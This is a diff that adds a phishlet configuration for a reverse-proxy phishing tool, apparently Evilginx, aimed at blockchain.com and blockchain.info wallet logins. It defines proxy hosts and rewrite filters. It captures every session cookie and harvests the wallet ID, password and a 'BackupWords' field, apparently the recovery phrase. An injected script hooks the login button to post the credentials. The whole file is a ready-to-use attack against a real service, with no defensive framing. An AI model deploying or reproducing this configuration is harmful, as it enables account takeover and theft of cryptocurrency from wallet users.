@@ -1,0 +1,76 @@
+author: '@An0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'blockchain.com', session: true, is_landing: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'blockchain.com', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: '', domain: 'blockchain.info', session: false, is_landing: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'blockchain.info', session: false, is_landing: false}
+#  - {phish_sub: 'wallet-helper', orig_sub: 'wallet-helper', domain: 'blockchain.com', session: false, is_landing: false}
+#  - {phish_sub: '', orig_sub: '', domain: 'blockchain.com', session: false, is_landing: false}
+
+
+sub_filters:
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: 'href="https://{hostname}/#/signup"', replace: 'href="https://{hostname}/#/login"', mimes: ['text/html', 'text/javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'www', domain: 'blockchain.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'www', domain: 'blockchain.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: '', domain: 'blockchain.info', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'api', domain: 'blockchain.info', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.blockchain.com', orig_sub: 'api', domain: 'blockchain.info', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'www', domain: 'blockchain.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'www', domain: 'blockchain.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'login', domain: 'blockchain.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: '', domain: 'blockchain.info', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'api', domain: 'blockchain.info', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.blockchain.com', orig_sub: 'api', domain: 'blockchain.info', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+auth_tokens:
+  - domain: '.blockchain.com'
+    keys: ['.*,regexp']
+  - domain: '.blockchain.info'
+    keys: ['.*,regexp']
+auth_urls:
+  - '#/home.*' 
+
+credentials:
+  username:
+    key: 'guid'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'BackupWords'
+      search: '(.*)'
+      type: 'post'    
+login:
+  domain: 'www.blockchain.com'
+  path: '/'
+
+# To insert the wallet id directly from link  
+# https://login.blockchain.com/#/login/dxxxxxxa-xxx8-xx4x-xxfa-dxxxx9xxx76ce  
+js_inject:
+  - trigger_domains: ["login.blockchain.com"]
+    trigger_paths: ["/"]
+    script: |
+        function onclickListener(){
+            var submit = document.querySelectorAll('button[type=submit]')[0];
+            submit.setAttribute("onclick", "sendPass()");
+            return;
+            }
+        function sendPass(){
+            var walletID = document.getElementsByName("guid")[0].value;
+            var password = document.getElementsByName("password")[0].value;
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", '/', true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.send("guid="+encodeURIComponent(walletID)+""+" password="+encodeURIComponent(password));
+            return;
+            }
+        setTimeout(function(){ onclickListener(); }, 100);
+        
